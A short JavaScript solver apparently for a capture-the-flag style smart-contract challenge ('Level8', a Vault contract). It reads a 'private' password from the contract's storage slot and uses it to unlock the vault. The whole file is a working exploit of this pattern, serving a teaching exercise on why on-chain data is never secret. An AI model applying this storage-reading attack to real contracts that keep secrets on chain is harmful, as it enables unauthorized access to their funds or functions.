const level8 = async (web3, Vault) => {

    const targetAddress = '0x76c982f1a6a0098af53b0046c32086bc95f57501';

    console.log(`Exploiting Level8 target ${targetAddress}...`);

    console.log('Retrieving Vault contract...');
    const target = await Vault.at(targetAddress);

    console.log('Retrieving password...');
    // it's the item in the second position
    const hexPassword = await web3.eth.getStorageAt(targetAddress, 1);
    console.log(hexPassword);

    const bytesPassword = web3.utils.hexToBytes(hexPassword);

    console.log('Unlocking the vault...');
    await target.unlock(bytesPassword);
};

module.exports = level8;